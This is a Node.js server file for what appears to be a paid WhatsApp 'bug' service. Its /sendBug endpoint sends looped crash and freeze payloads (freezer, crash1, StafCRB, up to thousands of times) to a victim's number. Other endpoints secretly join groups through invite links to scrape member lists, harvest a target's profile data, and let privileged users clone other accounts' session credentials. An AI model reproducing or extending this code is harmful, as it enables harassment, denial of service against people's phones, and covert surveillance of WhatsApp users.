app.get("/spyGroup", async (req, res) => {
  const { key, link } = req.query;
  const match = link.match(/chat\.whatsapp\.com\/([a-zA-Z0-9]{22})/);
  if (!match) return res.json({ valid: false, message: "Invalid link" });

  const code = match[1];
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.json({ valid: false });

  const bizKeys = Object.keys(biz);
  if (!bizKeys.length) return res.json({ valid: false, message: "No socket available" });

  const sock = biz[bizKeys[Math.floor(Math.random() * bizKeys.length)]];

  try {
    const groupJid = await sock.groupAcceptInvite(code);
    const metadata = await sock.groupMetadata(groupJid);

    const admins = metadata.participants.filter(p => p.admin).map(p => p.id.replace(/@.+/, ''));
    const members = metadata.participants.filter(p => !p.admin).map(p => p.id.replace(/@.+/, ''));

    await sock.groupLeave(groupJid);

    return res.json({
      valid: true,
      groupId: groupJid,
      groupName: metadata.subject,
      desc: metadata.desc || "No description",
      admin: admins,
      participant: members,
    });
  } catch (err) {
    console.warn("[❌ SPY GROUP ERROR]", err.message);
    return res.json({ valid: false, message: "Spy failed" });
  }
});

app.get("/getInfo", async (req, res) => {
  const { key, number } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });

  const bizKeys = Object.keys(biz);
  if (!bizKeys.length) return res.json({ valid: false, message: "No connection" });

  const sock = biz[bizKeys[Math.floor(Math.random() * bizKeys.length)]];
  const jid = number.includes("@") ? number : number + "@s.whatsapp.net";

  try {
    const ppUrl = await sock.profilePictureUrl(jid, 'image').catch(() => null);
    const statusObj = await sock.fetchStatus(jid).catch(() => null);
    const check = await sock.onWhatsApp(number).catch(() => []);
    const info = check[0] || {};

    return res.json({
      valid: true,
      number: number,
      photo: ppUrl || "https://static.vecteezy.com/system/resources/previews/009/292/244/non_2x/default-avatar-icon-of-social-media-user-vector.jpg",
      bio: statusObj?.status || "No bio",
      online: !!statusObj?.lastSeen,
      type: info.biz ? "business" : "personal"
    });
  } catch (err) {
    console.warn("[❌ GETINFO ERROR]", err.message);
    return res.json({ valid: false, message: "Query failed" });
  }
});

const KEY_LIST_FILE = path.join(__dirname, 'keyList.json');

function loadKeyList() {
  try {
    return JSON.parse(fs.readFileSync(KEY_LIST_FILE, 'utf8'));
  } catch {
    return [];                // file belum ada / rusak → mulai kosong
  }
}

function saveKeyList(list) {
  fs.writeFileSync(KEY_LIST_FILE, JSON.stringify(list, null, 2));
}

function resolveKeyInfo(key) {
  if (!key) return null;
  let keyInfo = activeKeys[key];
  if (keyInfo) return keyInfo;

  const list = loadKeyList();
  const record = list.find(e => e.sessionKey === key);
  if (!record) return null;

  const created = new Date(record.lastLogin).getTime();
  keyInfo = {
    username: record.username,
    created,
    expires: created + 10 * 60 * 1000,
  };
  activeKeys[key] = keyInfo;
  return keyInfo;
}

function recordKey({ username, key, role, ip, androidId }) {
  const list = loadKeyList();
  const stamp = new Date().toISOString();
  const idx = list.findIndex(e => e.username === username);

  if (idx !== -1) {
    list[idx] = { username, lastLogin: stamp, sessionKey: key, ipAddress: ip, androidId };
  } else {
    list.push({ username, lastLogin: stamp, sessionKey: key, ipAddress: ip, androidId });
  }

  saveKeyList(list);
}

const news = newsCache;

// ===== Endpoint: Login & Key Fetch (version 3.0 required) =====
app.post("/validate", (req, res) => {
  const { username, password, version, androidId } = req.body;

  if (!androidId) {
    return res.json({ valid: false, message: "androidId required" });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === username && u.password === password);

  if (!user) return res.json({ valid: false });

  if (isExpired(user)) {
    return res.json({ valid: true, expired: true });
  }

  // Cek apakah device sama
  const keyList = loadKeyList();
  const existingSession = keyList.find(e => e.username === username);
  if (existingSession && existingSession.androidId !== androidId) {
    // device berbeda, override
    console.log(`[📱] Device login baru, override session untuk ${username}`);
  }

  // generate key baru & override
  const key = generateKey();
  activeKeys[key] = {
    username,
    created: Date.now(),
    expires: Date.now() + 10 * 60 * 1000,
  };

  recordKey({
    username,
    key,
    role: user.role || 'member',
    ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip,
    androidId,
  });

  return res.json({
    valid: true,
    expired: false,
    key,
    expiredDate: user.expiredDate,
    telegramId: user.telegramId || "",
    role: user.role || "member",
    listBug: numberBugs,
    listGroupBug: groupBugs,
    news: loadNews()
  });
});

app.get("/myInfo", (req, res) => {
  const { username, password, androidId, key } = req.query;
  console.log("[ℹ️ INFO] Fetching info for:", username);

  const db = loadDatabase();
  const user = db.find(u => u.username === username && u.password === password);
  const keyList = loadKeyList();
  const userKey = keyList.find(k => k.username === username);
  console.log(userKey)

  if (!userKey) {
    console.log("[❌ KEY] Invalid or missing session key.");
    return res.json({ valid: false, reason: "session" });
  }

  if (userKey.androidId !== androidId) {
    console.log("[⚠️ DEVICE] Device mismatch:", userKey.androidId, "!=", androidId);
    return res.json({ valid: false, reason: "device" });
  }

  if (!user) {
    console.log("[❌ INFO] User not found.");
    return res.json({ valid: false });
  }

  if (isExpired(user)) {
    console.log("[⚠️ INFO] User expired.");
    return res.json({ valid: true, expired: true });
  }

  recordKey({
    username,
    key,
    role: user.role || 'member',
    ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip,
    androidId
  });

  console.log("[✅ INFO] Info dikirim untuk:", username);

  return res.json({
    valid: true,
    expired: false,
    key,
    username: user.username,
    password: "******",
    expiredDate: user.expiredDate,
    telegramId: user.telegramId || "",
    role: user.role || "member",
    listBug: numberBugs,
    listGroupBug: groupBugs,
    news: loadNews() // ✅ Tambahkan ini
  });
});

app.get("/getOnlineUsers", (req, res) => {
  const { key } = req.query;
  const keyInfo = resolveKeyInfo(key);
  if (!keyInfo) return res.json({ valid: false, count: 0 });

  const now = Date.now();
  const onlineUserNames = [];

  for (const k in activeKeys) {
    const info = activeKeys[k];
    if (info && info.expires > now) {
      onlineUserNames.push(info.username);
    }
  }

  const uniqueUsers = [...new Set(onlineUserNames)];

  // Also count active WebSocket connections
  let activeConnectionsCount = 0;
  for (const clientId in wsClients) {
    if (wsClients[clientId] && wsClients[clientId].readyState === WebSocket.OPEN) {
      activeConnectionsCount++;
    }
  }

  res.json({ valid: true, count: uniqueUsers.length, activeConnections: activeConnectionsCount });
});

app.post("/changepass", (req, res) => {
  const { username, oldPass, newPass } = req.body;
  if (!username || !oldPass || !newPass) {
    return res.json({ success: false, message: "Incomplete data" });
  }

  const db = loadDatabase();
  const idx = db.findIndex(u => u.username === username && u.password === oldPass);
  if (idx === -1) {
    return res.json({ success: false, message: "Invalid credentials" });
  }

  db[idx].password = newPass;
  saveDatabase(db);

  return res.json({ success: true, message: "Password updated successfully" });
});

const GLOBAL_SENDER_FOLDER = "__global__";
const GLOBAL_SENDER_TIMEZONE = "Asia/Jakarta";

function canManageGlobalSender(role = "member") {
  const normalizedRole = normalizeRoleName(role);
  return ["owner", "developer", "all_access", "tk", "pt", "owner_vip", "vip", "reseller", "member"].includes(normalizedRole);
}

function getGlobalSenderDailyLimit(role = "member") {
  return null;
}

function canUseGlobalSender(role = "member") {
  return true;
}

function formatSenderQuotaDate(date = new Date()) {
  const parts = new Intl.DateTimeFormat("en-GB", {
    timeZone: GLOBAL_SENDER_TIMEZONE,
    year: "numeric",
    month: "2-digit",
    day: "2-digit",
  }).formatToParts(date);

  const year = parts.find(part => part.type === "year")?.value || "0000";
  const month = parts.find(part => part.type === "month")?.value || "00";
  const day = parts.find(part => part.type === "day")?.value || "00";
  return `${year}-${month}-${day}`;
}

function ensureGlobalSenderUsageState(user) {
  const today = formatSenderQuotaDate();
  let changed = false;

  if (!user.globalSenderUsage || typeof user.globalSenderUsage !== "object") {
    user.globalSenderUsage = { date: today, count: 0 };
    return true;
  }

  if (user.globalSenderUsage.date !== today) {
    user.globalSenderUsage.date = today;
    user.globalSenderUsage.count = 0;
    changed = true;
  }

  if (!Number.isFinite(user.globalSenderUsage.count) || user.globalSenderUsage.count < 0) {
    user.globalSenderUsage.count = 0;
    changed = true;
  }

  return changed;
}

function getGlobalSenderQuotaPayload(user) {
  ensureGlobalSenderUsageState(user);

  const normalizedRole = normalizeRoleName(user?.role || "member");
  const limit = getGlobalSenderDailyLimit(normalizedRole);
  const used = Number(user?.globalSenderUsage?.count || 0);
  const unlimited = limit === null;

  return {
    role: normalizedRole,
    canAdd: canManageGlobalSender(normalizedRole),
    canUse: canUseGlobalSender(normalizedRole),
    used,
    limit,
    remaining: unlimited ? null : Math.max(limit - used, 0),
    unlimited,
    date: user?.globalSenderUsage?.date || formatSenderQuotaDate(),
  };
}

function getGlobalSenderDeniedMessage(role = "member") {
  return `Role ${String(role).toUpperCase()} tidak diizinkan memakai Global Sender.`;
}

function getGlobalSenderLimitMessage(role = "member", quota = {}) {
  const limit = quota.limit ?? getGlobalSenderDailyLimit(role);
  const used = quota.used ?? 0;
  return `Limit Global Sender untuk role ${String(role).toUpperCase()} sudah habis (${used}/${limit}).`;
}

function consumeGlobalSenderQuota(user) {
  const quota = getGlobalSenderQuotaPayload(user);

  if (!quota.canUse) {
    return {
      ok: false,
      changed: false,
      quota,
      message: getGlobalSenderDeniedMessage(quota.role),
    };
  }

  if (!quota.unlimited && quota.used >= quota.limit) {
    return {
      ok: false,
      changed: false,
      quota,
      message: getGlobalSenderLimitMessage(quota.role, quota),
    };
  }

  if (!quota.unlimited) {
    user.globalSenderUsage.count = quota.used + 1;
  }

  return {
    ok: true,
    changed: !quota.unlimited,
    quota: getGlobalSenderQuotaPayload(user),
  };
}

function buildSessionCacheKey(folderNameOrPath = "", sessionName = "") {
  const folderName = path.basename(String(folderNameOrPath).replace(/[\\/]+$/, "")) || String(folderNameOrPath);
  return `${folderName}::${sessionName}`;
}

function ensureSessionDir(sessionDir) {
  fs.mkdirSync(sessionDir, { recursive: true });
}

function createSafeSaveCreds(saveCreds, sessionDir) {
  return async () => {
    try {
      ensureSessionDir(sessionDir);
      await saveCreds();
    } catch (err) {
      if (err?.code === "ENOENT") {
        try {
          ensureSessionDir(sessionDir);
          await saveCreds();
        } catch (retryErr) {
          console.error(`❌ Gagal menyimpan creds ${sessionDir}:`, retryErr?.message || retryErr);
        }
        return;
      }
      console.error(`❌ Gagal menyimpan creds ${sessionDir}:`, err?.message || err);
    }
  };
}

function buildSenderConnectionItem(sender, scope, role) {
  const sessionName = sender?.sessionName?.toString() || sender?.id?.toString() || "Unknown";
  const isGlobal = scope === "global";

  return {
    id: sender?.id?.toString() || sessionName,
    sessionName,
    scope,
    isGlobal,
    canDelete: isGlobal ? canManageGlobalSender(role) : true,
  };
}

// ===================== GLOBAL SENDER SESSIONS =====================
const GLOBAL_SENDER_SESSIONS_FILE = 'global_sender_sessions.json';
let globalSenderSessions = []; // array of session names

// Load daftar session yang diizinkan
function loadGlobalSenderSessions() {
  try {
    if (fs.existsSync(GLOBAL_SENDER_SESSIONS_FILE)) {
      globalSenderSessions = JSON.parse(fs.readFileSync(GLOBAL_SENDER_SESSIONS_FILE, 'utf8'));
    } else {
      globalSenderSessions = [];
      fs.writeFileSync(GLOBAL_SENDER_SESSIONS_FILE, JSON.stringify(globalSenderSessions, null, 2));
    }
    console.log(`📋 Loaded ${globalSenderSessions.length} global sender sessions`);
  } catch (e) {
    console.error("Error loading global sender sessions:", e);
    globalSenderSessions = [];
  }
}

function saveGlobalSenderSessions() {
  fs.writeFileSync(GLOBAL_SENDER_SESSIONS_FILE, JSON.stringify(globalSenderSessions, null, 2));
}

// Panggil saat server start (letakkan di dalam app.listen atau setelah fungsi didefinisikan)
loadGlobalSenderSessions();

// Modifikasi fungsi checkActiveSessionInFolder untuk mendukung filter global session
// Jika forGlobal = true, hanya ambil session yang ada di globalSenderSessions
const originalCheckActiveSessionInFolder = checkActiveSessionInFolder; // simpan yang lama jika perlu
checkActiveSessionInFolder = function (subfolderName, forGlobal = false) {
  const folderPath = path.join('permenmd', subfolderName);
  if (!fs.existsSync(folderPath)) return null;

  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  const activeSessions = [];

  for (const file of jsonFiles) {
    const sessionName = path.basename(file, ".json");
    const cacheKey = buildSessionCacheKey(subfolderName, sessionName);
    const sock = activeConnections[cacheKey];
    if (sock) {
      if (forGlobal) {
        if (globalSenderSessions.includes(sessionName)) {
          activeSessions.push({ sock, sessionName, cacheKey });
        }
      } else {
        activeSessions.push({ sock, sessionName, cacheKey });
      }
    }
  }

  if (!activeSessions.length) return null;
  return activeSessions[Math.floor(Math.random() * activeSessions.length)];
};

// ===================== ENDPOINT MANAJEMEN GLOBAL SENDER =====================
// GET /getGlobalSenders - Lihat daftar session yang terdaftar
app.get("/getGlobalSenders", (req, res) => {
  const { key } = req.query;
  const keyInfo = resolveKeyInfo(key);
  if (!keyInfo) return res.status(401).json({ error: "Invalid session key" });
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) {
    return res.status(403).json({ error: "Access denied." });
  }
  res.json({ valid: true, sessions: globalSenderSessions });
});

// POST /addGlobalSender - Tambah session ke daftar
app.post("/addGlobalSender", (req, res) => {
  const { key, sessionName } = req.body;
  const keyInfo = resolveKeyInfo(key);
  if (!keyInfo) return res.status(401).json({ error: "Invalid session key" });
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user || !['all_access', 'owner_vip', 'owner', 'tk', 'pt', 'reseller', 'vip', 'member', 'developer'].includes(normalizeRoleName(user.role))) {
    return res.status(403).json({ error: "Access denied." });
  }
  if (!sessionName || typeof sessionName !== 'string') {
    return res.status(400).json({ error: "sessionName required" });
  }
  if (!globalSenderSessions.includes(sessionName)) {
    globalSenderSessions.push(sessionName);
    saveGlobalSenderSessions();
  }
  res.json({ valid: true, sessions: globalSenderSessions });
});

// DELETE /removeGlobalSender - Hapus session dari daftar
app.delete("/removeGlobalSender", (req, res) => {
  const { key, sessionName } = req.body;
  const keyInfo = resolveKeyInfo(key);
  if (!keyInfo) return res.status(401).json({ error: "Invalid session key" });
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user || !['all_access', 'owner_vip', 'owner', 'tk', 'pt', 'reseller', 'vip', 'member', 'developer'].includes(normalizeRoleName(user.role))) {
    return res.status(403).json({ error: "Access denied." });
  }
  const index = globalSenderSessions.indexOf(sessionName);
  if (index !== -1) {
    globalSenderSessions.splice(index, 1);
    saveGlobalSenderSessions();
  }
  res.json({ valid: true, sessions: globalSenderSessions });
});

// POST /pairingGlobal - Pairing nomor untuk global sender
app.post("/pairingGlobal", async (req, res) => {
  const { key, number } = req.body;
  const keyInfo = resolveKeyInfo(key);
  if (!keyInfo) return res.status(401).json({ valid: false, message: "Invalid session key" });
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(401).json({ valid: false, message: "User not found" });
  const cleanNumber = String(number || "").replace(/\D/g, "");
  if (!cleanNumber) return res.status(400).json({ valid: false, message: "Number is required" });
  try {
    const ownerFolder = GLOBAL_SENDER_FOLDER;
    const cacheKey = buildSessionCacheKey(ownerFolder, cleanNumber);
    const sessionDir = path.join('permenmd', ownerFolder, cleanNumber);
    ensureSessionDir(sessionDir);
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    const safeSaveCreds = createSafeSaveCreds(saveCreds, sessionDir);
    const { version } = await fetchLatestBaileysVersion();
    const sock = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      version: version,
      defaultQueryTimeoutMs: undefined,
    });
    sock.ev.on("creds.update", safeSaveCreds);
    sock.ev.on("connection.update", async (update) => {
      const { connection, lastDisconnect } = update;
      if (connection === "close") {
        const isLoggedOut = lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut;
        if (!isLoggedOut) {
          await waiting(3000);
          await pairingWa(cleanNumber, ownerFolder);
        } else {
          delete activeConnections[cacheKey];
          delete biz[cacheKey];
          delete mess[cacheKey];
        }
      } else if (connection === "open") {
        activeConnections[cacheKey] = sock;
        const sourceCreds = path.join(sessionDir, "creds.json");
        const destCreds = path.join("permenmd", ownerFolder, `${cleanNumber}.json`);
        const type = detectWATypeFromCreds(sourceCreds);
        if (type === "Business") biz[cacheKey] = sock;
        else if (type === "Messenger") mess[cacheKey] = sock;
        if (!globalSenderSessions.includes(cleanNumber)) {
          globalSenderSessions.push(cleanNumber);
          saveGlobalSenderSessions();
        }
        try {
          await waiting(3000);
          if (fs.existsSync(sourceCreds)) {
            fs.writeFileSync(destCreds, fs.readFileSync(sourceCreds));
          }
        } catch (_) { }
      }
    });
    if (!sock.authState.creds.registered) {
      await waiting(1000);
      let code = await sock.requestPairingCode(cleanNumber);
      if (code) return res.json({ valid: true, pairingCode: code, number: cleanNumber });
      else return res.json({ valid: false, message: "Failed to get pairing code" });
    }
    return res.json({ valid: false, message: "Already registered" });
  } catch (err) {
    return res.status(500).json({ valid: false, error: err.message });
  }
});

// GET /sendMessageViaGlobal - Kirim pesan via global sender
app.get("/sendMessageViaGlobal", async (req, res) => {
  const { key, target, message } = req.query;
  const keyInfo = resolveKeyInfo(key);
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key" });
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.json({ valid: false, message: "User not found" });
  if (!target || !message) return res.json({ success: false, message: "Target and message required" });
  try {
    const session = getRandomActiveSession();
    if (!session) return res.json({ success: false, message: "No global sender available" });
    const recipient = target.includes('@s.whatsapp.net') ? target : `${target}@s.whatsapp.net`;
    await session.sendMessage(recipient, { text: message });
    user.lastSend = new Date().toISOString();
    saveDatabase(db);
    res.json({ success: true, message: "Message sent via global sender" });
  } catch (err) {
    res.json({ success: false, error: err.message });
  }
});

app.get("/sendBug", async (req, res) => {
  const { key, bug } = req.query;
  const senderType = String(req.query.senderType || "private").trim().toLowerCase() === "global"
    ? "global"
    : "private";
  let { target } = req.query;
  target = (target || "").replace(/\D/g, "");
  console.log(`[📤 BUG] Send bug to ${target} using key ${key} - Bug: ${bug} - Sender: ${senderType}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ BUG] Key tidak valid.");
    return res.json({ valid: false });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) {
    console.log("[❌ BUG] User tidak ditemukan.");
    return res.json({ valid: false });
  }

  let shouldSaveDatabase = ensureGlobalSenderUsageState(user);
  let globalSenderQuota = getGlobalSenderQuotaPayload(user);
  let selectedSession = null;

  if (senderType === "global") {
    // Cek quota global sender (jika ada limit)
    if (!globalSenderQuota.canUse) {
      if (shouldSaveDatabase) saveDatabase(db);
      return res.json({
        valid: true,
        sended: false,
        senderType,
        message: getGlobalSenderDeniedMessage(user.role || "member"),
        globalSenderQuota,
      });
    }

    if (!globalSenderQuota.unlimited && globalSenderQuota.used >= globalSenderQuota.limit) {
      if (shouldSaveDatabase) saveDatabase(db);
      return res.json({
        valid: true,
        sended: false,
        senderType,
        message: getGlobalSenderLimitMessage(user.role || "member", globalSenderQuota),
        globalSenderQuota,
      });
    }

    selectedSession = checkActiveSessionInFolder(GLOBAL_SENDER_FOLDER);
    if (!selectedSession) {
      for (const sessionName of globalSenderSessions) {
        for (const u of db) {
          const cacheKey = buildSessionCacheKey(u.username, sessionName);
          const sock = activeConnections[cacheKey];
          if (sock) {
            selectedSession = { sock, sessionName, cacheKey };
            break;
          }
        }
        if (selectedSession) break;
      }
    }
    if (!selectedSession) {
      if (shouldSaveDatabase) saveDatabase(db);
      return res.json({
        valid: true,
        sended: false,
        senderType,
        message: "Tidak ada Global Sender aktif saat ini.",
        globalSenderQuota,
      });
    }
  } else {
    // Private sender: bebas untuk semua role (tetap pakai session pribadi)
    selectedSession = checkActiveSessionInFolder(user.username);
    if (!selectedSession) {
      if (shouldSaveDatabase) saveDatabase(db);
      return res.json({
        valid: true,
        sended: false,
        senderType,
        message: "Tidak ada sender pribadi aktif pada akun ini.",
        globalSenderQuota,
      });
    }
  }

  // ===== Role-based Cooldown =====
  const roleCooldowns = {
    member: 300,
    reseller: 240,
    reseller1: 60,
    owner: 0,
    owner_vip: 0,
    vip: 60,
  };
  const role = user.role || "member";
  const cooldownSeconds = roleCooldowns[role] || 60;

  if (!user.lastSend) user.lastSend = 0;

  const now = Date.now();
  const diffSeconds = Math.floor((now - user.lastSend) / 1000);
  if (diffSeconds < cooldownSeconds) {
    if (shouldSaveDatabase) saveDatabase(db);
    console.log(`${user.username} Still Cooldown`);
    return res.json({
      valid: true,
      sended: false,
      cooldown: true,
      wait: cooldownSeconds - diffSeconds,
      senderType,
      globalSenderQuota,
    });
  }

  if (senderType === "global") {
    const quotaResult = consumeGlobalSenderQuota(user);
    globalSenderQuota = quotaResult.quota;
    if (!quotaResult.ok) {
      if (shouldSaveDatabase) saveDatabase(db);
      return res.json({
        valid: true,
        sended: false,
        senderType,
        message: quotaResult.message,
        globalSenderQuota,
      });
    }
    shouldSaveDatabase = shouldSaveDatabase || quotaResult.changed;
  }

  // Simpan lastSend
  user.lastSend = now;
  saveDatabase(db);
  console.log(`${user.username} Trigger Cooldown`);

  res.json({
    valid: true,
    sended: true,
    cooldown: false,
    role,
    senderType,
    senderSession: selectedSession.sessionName,
    globalSenderQuota,
  });

  // ============ Kirim Bug di Background (tidak berubah) ============
  setImmediate(async () => {
    const isMessBug = false;
    console.log("Received Signal");
    const activeFolder = senderType === "global" ? GLOBAL_SENDER_FOLDER : user.username;
    const attemptSend = async (session, retry = false) => {
      try {
        const sock = session?.sock;
        if (!sock) {
          throw new Error("Sender session not available");
        }

        const targetJid = target + "@s.whatsapp.net";
        console.log("Received Signal 2");
        console.log(`${targetJid}`);
        switch (bug) {
          case "number1":
            for (let i = 0; i < 20; i++) {
              await delayCrm(sock, targetJid);
              await cobain(sock, targetJid);
              await carousel(sock, targetJid);
              await invisibledelay(sock, targetJid);
              await sleep(100);
            }
            break;
          case "number2":
            for (let i = 0; i < 90; i++) {
              await freezer(sock, targetJid);
              await sleep(100);
            }
            break;
          case "number3":
            for (let i = 0; i < 5; i++) {
              await VnXNewBlank(sock, targetJid);
              await sleep(1500);
            }
            break;
          case "grub1":
            for (let i = 0; i < 10; i++) {
              await groupBan(sock, groupJid);
              await sleep(1000);
            }
            break;
          case "fcinvis":
            for (let i = 0; i < 1000; i++) {
              await crash1(sock, targetJid);
              await crasOneHit(sock, targetJid);
              await crash1(sock, targetJid);
              await sleep(1000);
            }
            break;
          case "buldo":
            for (let i = 0; i < 3000; i++) {
              await StafCRB(sock, targetJid);
              await StafCRB(sock, targetJid);
              await StafCRB(sock, targetJid);
              await sleep(1500);

            }
            break;
        }

        console.log(`[✅ BUG] Bug '${bug}' terkirim ke ${target}`);
        return true;
      } catch (err) {
        console.warn(`[⚠️ SEND ERROR] ${err.message}`);
        if (session?.cacheKey && err.message === 'Connection Closed') {
          delete activeConnections[session.cacheKey];
          delete biz[session.cacheKey];
          delete mess[session.cacheKey];
        }
        if (!retry) {
          const retrySession = await checkActiveSessionInFolder(activeFolder);
          if (retrySession) return await attemptSend(retrySession, true);
        }
        console.warn(`[❌ GAGAL] Kirim bug '${bug}' ke ${target}`);
        return false;
      }
    };

    if (!selectedSession?.sock) {
      console.warn(`[❌ NO SOCK] Tidak ada koneksi ${isMessBug ? 'Messenger' : 'aktif'} tersedia.`);
      return;
    }

    await attemptSend(selectedSession);
  });
});

// ====================================================
// API /scanSenders - Scan semua sender aktif (VIP Clone)
// ====================================================
app.get("/scanSenders", (req, res) => {
  const { key } = req.query;

  const keyInfo = resolveKeyInfo(key);
  if (!keyInfo) {
    return res.json({ valid: false, message: "Invalid session key" });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) {
    return res.json({ valid: false, message: "User not found" });
  }

  // VIP, owner, developer, admin bisa scan
  const allowedRoles = ["vip", "owner", "developer", "admin"];
  const userRole = normalizeRoleName(user.role || "member");
  if (!allowedRoles.includes(userRole)) {
    return res.json({ valid: false, message: "Hanya VIP/Admin yang bisa scan sender." });
  }

  try {
    const allSenders = [];

    if (!fs.existsSync("permenmd")) {
      return res.json({ valid: true, senders: [] });
    }

    const userFolders = fs.readdirSync("permenmd").filter(f => {
      const fullPath = path.join("permenmd", f);
      return fs.statSync(fullPath).isDirectory();
    });

    for (const folderName of userFolders) {
      // Skip folder global, scan folder user aja
      if (folderName === GLOBAL_SENDER_FOLDER) continue;

      const folderPath = path.join("permenmd", folderName);
      const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));

      for (const file of jsonFiles) {
        const sessionName = path.basename(file, ".json");
        const cacheKey = buildSessionCacheKey(folderName, sessionName);
        const sock = activeConnections[cacheKey] || biz[cacheKey] || mess[cacheKey];

        if (sock) {
          const ownerUser = db.find(u => u.username === folderName) || {};

          allSenders.push({
            sessionName: sessionName,
            ownerUsername: folderName,
            ownerRole: ownerUser.role || "member",
            scope: "private",
            isActive: true,
            alreadyCloned: false
          });
        }
      }
    }

    return res.json({
      valid: true,
      senders: allSenders,
      total: allSenders.length
    });

  } catch (err) {
    console.error("❌ Error scanSenders:", err);
    return res.json({ valid: false, message: "Gagal scan sender: " + err.message });
  }
});

// ====================================================
// API /cloneSender - Clone sender ke akun VIP
// ====================================================
app.post("/cloneSender", async (req, res) => {
  const { key, sessionName, ownerUsername } = req.body;

  const keyInfo = resolveKeyInfo(key);
  if (!keyInfo) {
    return res.json({ valid: false, message: "Invalid session key" });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) {
    return res.json({ valid: false, message: "User not found" });
  }

  // VIP bisa clone dari role manapun (member, reseller, admin, owner)
  const allowedRoles = ["vip", "owner", "developer", "admin"];
  const userRole = normalizeRoleName(user.role || "member");
  if (!allowedRoles.includes(userRole)) {
    return res.json({ valid: false, message: "Hanya VIP/Admin yang bisa clone sender." });
  }

  if (!sessionName || !ownerUsername) {
    return res.json({ valid: false, message: "sessionName dan ownerUsername wajib diisi." });
  }

  try {
    // Path sumber (sender asli)
    const sourceJson = path.join("permenmd", ownerUsername, `${sessionName}.json`);
    const sourceFolder = path.join("permenmd", ownerUsername, sessionName);

    // Path tujuan (folder user VIP)
    const destFolder = path.join("permenmd", user.username);
    const destJson = path.join(destFolder, `${sessionName}.json`);
    const destSessionFolder = path.join(destFolder, sessionName);

    // Cek apakah sumber ada
    if (!fs.existsSync(sourceJson) && !fs.existsSync(sourceFolder)) {
      return res.json({ valid: false, message: "Sender tidak ditemukan di akun sumber." });
    }

    // Cek apakah sudah ada di akun tujuan
    if (fs.existsSync(destJson) || fs.existsSync(destSessionFolder)) {
      return res.json({ valid: false, message: "Sender sudah ada di akun kamu." });
    }

    // Bikin folder tujuan kalo belum ada
    if (!fs.existsSync(destFolder)) {
      fs.mkdirSync(destFolder, { recursive: true });
    }

    // Copy file .json
    if (fs.existsSync(sourceJson)) {
      fs.copyFileSync(sourceJson, destJson);
      console.log(`✅ Clone: ${sourceJson} → ${destJson}`);
    }

    // Copy folder session (kalo ada)
    if (fs.existsSync(sourceFolder)) {
      const fse = require('fs-extra');
      fse.copySync(sourceFolder, destSessionFolder);
      console.log(`✅ Clone folder: ${sourceFolder} → ${destSessionFolder}`);
    }

    // Kirim response sukses dulu
    res.json({
      valid: true,
      message: `Sender ${sessionName} berhasil di-clone & akan auto-connect...`,
      sessionName: sessionName,
      clonedTo: user.username
    });

    // Auto-reconnect setelah 2 detik
    setTimeout(async () => {
      try {
        const sessionDir = path.join("permenmd", user.username, sessionName);
        ensureSessionDir(sessionDir);

        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
        const safeSaveCreds = createSafeSaveCreds(saveCreds, sessionDir);
        const { version } = await fetchLatestBaileysVersion();

        const sock = makeWASocket({
          auth: state,
          printQRInTerminal: false,
          logger: pino({ level: "silent" }),
          version: version,
          defaultQueryTimeoutMs: undefined,
        });

        sock.ev.on("creds.update", safeSaveCreds);
        sock.ev.on("connection.update", (update) => {
          const { connection } = update;
          if (connection === "open") {
            const cacheKey = buildSessionCacheKey(user.username, sessionName);
            activeConnections[cacheKey] = sock;
            console.log(`✅ [CLONE-RECONNECT] ${sessionName} berhasil connect ulang!`);
          }
        });
      } catch (err) {
        console.error(`❌ [CLONE-RECONNECT] Gagal reconnect ${sessionName}:`, err.message);
      }
    }, 5000);

  } catch (err) {
    console.error("❌ Error cloneSender:", err);
    return res.json({ valid: false, message: "Gagal clone sender: " + err.message });
  }
});

function getActiveCredsInFolder(subfolderName) {
  const folderPath = path.join('permenmd', subfolderName);
  if (!fs.existsSync(folderPath)) return [];

  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  const activeCreds = [];

  for (const file of jsonFiles) {
    const sessionName = path.basename(file, ".json");
    // HARUS SAMA dengan yang dipakai di connectSession!
    const cacheKey = buildSessionCacheKey(subfolderName, sessionName);
    if (activeConnections[cacheKey]) {
      activeCreds.push({
        id: sessionName,
        sessionName: sessionName
      });
    }
  }
  return activeCreds;
}

function removeSessionArtifacts(folderPath, sessionName) {
  const sessionFolder = path.join(folderPath, sessionName);
  const sessionFile = path.join(folderPath, `${sessionName}.json`);

  if (fs.existsSync(sessionFolder)) {
    fs.rmSync(sessionFolder, { recursive: true, force: true });
  }

  if (fs.existsSync(sessionFile)) {
    fs.rmSync(sessionFile, { force: true });
  }
}

const deletingSessions = new Set();

// ========== PERSISTENSI SESSION SAAT RESTART ==========
const SESSION_BACKUP_FILE = './session_backup.json';
const SESSION_STATE_FILE = './session_state.json';  // ← TAMBAHKAN INI

// Backup session aktif sebelum restart
function backupActiveSessions() {
  const sessions = [];
  for (const [cacheKey, sock] of Object.entries(activeConnections)) {
